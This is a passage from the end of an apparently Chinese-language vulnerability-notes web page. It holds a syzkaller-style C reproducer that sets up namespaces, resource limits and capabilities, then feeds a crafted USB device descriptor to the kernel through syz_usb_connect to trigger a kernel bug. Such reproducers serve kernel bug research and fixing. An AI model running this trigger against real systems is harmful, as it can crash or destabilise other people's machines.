<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">dev_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a1</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">dev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">a2</span><span class="p">;</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="w"> </span><span class="n">descs</span><span class="w"> </span><span class="o">=</span>
<span class="w">      </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">vusb_connect_descriptors</span><span class="o">*</span><span class="p">)</span><span class="n">a3</span><span class="p">;</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">syz_usb_connect_impl</span><span class="p">(</span><span class="n">speed</span><span class="p">,</span><span class="w"> </span><span class="n">dev_len</span><span class="p">,</span><span class="w"> </span><span class="n">dev</span><span class="p">,</span><span class="w"> </span><span class="n">descs</span><span class="p">,</span>
<span class="w">                              </span><span class="o">&amp;</span><span class="n">lookup_connect_response_out_generic</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setup_common</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mount</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/sys/fs/fuse/connections&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;fusectl&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setup_binderfs</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mkdir</span><span class="p">(</span><span class="s">&quot;/dev/binderfs&quot;</span><span class="p">,</span><span class="w"> </span><span class="mo">0777</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mount</span><span class="p">(</span><span class="s">&quot;binder&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/dev/binderfs&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;binder&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">symlink</span><span class="p">(</span><span class="s">&quot;/dev/binderfs&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;./binderfs&quot;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">loop</span><span class="p">();</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sandbox_common</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span><span class="w"> </span><span class="n">SIGKILL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">setsid</span><span class="p">();</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">rlimit</span><span class="w"> </span><span class="n">rlim</span><span class="p">;</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mi">200</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">20</span><span class="p">);</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_AS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">136</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_FSIZE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_STACK</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">20</span><span class="p">;</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_CORE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span>
<span class="w">  </span><span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNS</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mount</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">MS_REC</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MS_PRIVATE</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWIPC</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="mh">0x02000000</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWUTS</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_SYSVSEM</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">name</span><span class="p">;</span>
<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="w"> </span><span class="n">value</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="n">sysctl_t</span><span class="p">;</span>
<span class="w">  </span><span class="k">static</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">sysctl_t</span><span class="w"> </span><span class="n">sysctls</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/shmmax&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;16777216&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/shmall&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;536870912&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/shmmni&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1024&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/msgmax&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;8192&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/msgmni&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1024&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/msgmnb&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1024&quot;</span><span class="p">},</span>
<span class="w">      </span><span class="p">{</span><span class="s">&quot;/proc/sys/kernel/sem&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;1024 1048576 500 1024&quot;</span><span class="p">},</span>
<span class="w">  </span><span class="p">};</span>
<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sysctls</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">sysctls</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">    </span><span class="n">write_file</span><span class="p">(</span><span class="n">sysctls</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">sysctls</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">value</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">wait_for_loop</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">status</span><span class="p">,</span><span class="w"> </span><span class="n">__WALL</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">WEXITSTATUS</span><span class="p">(</span><span class="n">status</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 减少进程的权限，只保留必要的Linux能力</span>
<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">drop_caps</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">__user_cap_header_struct</span><span class="w"> </span><span class="n">cap_hdr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">__user_cap_data_struct</span><span class="w"> </span><span class="n">cap_data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<span class="w">  </span><span class="n">cap_hdr</span><span class="p">.</span><span class="n">version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">_LINUX_CAPABILITY_VERSION_3</span><span class="p">;</span>
<span class="w">  </span><span class="n">cap_hdr</span><span class="p">.</span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getpid</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capget</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cap_hdr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cap_data</span><span class="p">))</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">drop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">CAP_SYS_PTRACE</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">CAP_SYS_NICE</span><span class="p">);</span>
<span class="w">  </span><span class="n">cap_data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">effective</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">drop</span><span class="p">;</span>
<span class="w">  </span><span class="n">cap_data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">permitted</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">drop</span><span class="p">;</span>
<span class="w">  </span><span class="n">cap_data</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">inheritable</span><span class="w"> </span><span class="o">&amp;=</span><span class="w"> </span><span class="o">~</span><span class="n">drop</span><span class="p">;</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capset</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cap_hdr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cap_data</span><span class="p">))</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// 设置沙箱环境，限制资源使用，创建新的网络命名空间等</span>
<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">do_sandbox_none</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWPID</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fork</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pid</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">wait_for_loop</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
<span class="w">  </span><span class="n">setup_common</span><span class="p">();</span>
<span class="w">  </span><span class="n">sandbox_common</span><span class="p">();</span>
<span class="w">  </span><span class="n">drop_caps</span><span class="p">();</span>
<span class="w">  </span><span class="n">initialize_netdevices_init</span><span class="p">();</span>
<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNET</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="n">write_file</span><span class="p">(</span><span class="s">&quot;/proc/sys/net/ipv4/ping_group_range&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;0 65535&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="n">initialize_tun</span><span class="p">();</span>
<span class="w">  </span><span class="n">initialize_netdevices</span><span class="p">();</span>
<span class="w">  </span><span class="n">setup_binderfs</span><span class="p">();</span>
<span class="w">  </span><span class="n">loop</span><span class="p">();</span>
<span class="w">  </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">close_fds</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MAX_FDS</span><span class="p">;</span><span class="w"> </span><span class="n">fd</span><span class="o">++</span><span class="p">)</span>
<span class="w">    </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">loop</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="mh">0x20000140</span><span class="p">,</span>
<span class="w">         </span><span class="s">&quot;</span><span class="se">\x12\x01\x00\x00\xab\xbe\x67\x40\xe9\x17\x4e\x8b\x08\x9c\x00\x00\x00</span><span class="s">&quot;</span>
<span class="w">         </span><span class="s">&quot;</span><span class="se">\x01\x09\x02\x12\x00\x01\x00\x00\x00\x00\x09\x04\x00\x08\x00\xff</span><span class="s">&quot;</span><span class="p">,</span>
<span class="w">         </span><span class="mi">33</span><span class="p">);</span>
<span class="w">  </span><span class="n">syz_usb_connect</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x24</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20000140</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<span class="w">  </span><span class="n">close_fds</span><span class="p">();</span>
<span class="p">}</span>
<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1ffff000ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000ul</span><span class="p">,</span><span class="w"> </span><span class="mi">0ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x32ul</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0ul</span><span class="p">);</span>
<span class="w">  </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20000000ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000000ul</span><span class="p">,</span><span class="w"> </span><span class="mi">7ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x32ul</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0ul</span><span class="p">);</span>
<span class="w">  </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_mmap</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21000000ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000ul</span><span class="p">,</span><span class="w"> </span><span class="mi">0ul</span><span class="p">,</span><span class="w"> </span><span class="mh">0x32ul</span><span class="p">,</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="mi">0ul</span><span class="p">);</span>
<span class="w">  </span><span class="n">do_sandbox_none</span><span class="p">();</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
</section>


                </article>
              

              
              
                <footer class="bd-footer-article">
                  
<div class="footer-article-items footer-article__inner">
  
    <div class="footer-article-item"><!-- Previous / next buttons -->
<div class="prev-next-area">
    <a class="left-prev"
       href="../../cve/CVE-2024-43894/CVE-2024-43894.html"
       title="previous page">
      <i class="fa-solid fa-angle-left"></i>
      <div class="prev-next-info">
        <p class="prev-next-subtitle">previous</p>
        <p class="prev-next-title">CVE-2024-43894</p>
      </div>
    </a>
    <a class="right-next"
       href="../uaf_netdev_unregister_kobject/uaf_netdev_unregister_kobject.html"
       title="next page">
      <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">KASAN: use-after-free Read in netdev_unregister_kobject</p>
      </div>
      <i class="fa-solid fa-angle-right"></i>
    </a>
</div></div>
  
</div>

                </footer>
              
            </div>
            
            
              
                <div class="bd-sidebar-secondary bd-toc"><div class="sidebar-secondary-items sidebar-secondary__inner">

  <div class="sidebar-secondary-item">
  <div class="page-toc tocsection onthispage">
    <i class="fa-solid fa-list"></i> Contents
  </div>
  <nav class="bd-toc-nav page-toc">
    <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">漏洞描述</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">崩溃报告</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">内核日志</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#poc">POC</a></li>
</ul>
  </nav></div>

</div></div>
              
            
          </div>
          <footer class="bd-footer-content">
            
<div class="bd-footer-content__inner container">
  
  <div class="footer-item">
    
<p class="component-author">
By Killuayz
</p>

  </div>
  
  <div class="footer-item">
    
  </div>
  
  <div class="footer-item">
    
  </div>
  
  <div class="footer-item">
    
  </div>
  
</div>
          </footer>
        

      </main>
    </div>
  </div>
  
  <!-- Scripts loaded after <body> so the DOM is not blocked -->
  <script src="../../../../../_static/scripts/bootstrap.js?digest=e353d410970836974a52"></script>
<script src="../../../../../_static/scripts/pydata-sphinx-theme.js?digest=e353d410970836974a52"></script>

  <footer class="bd-footer">
  </footer>
  </body>
</html>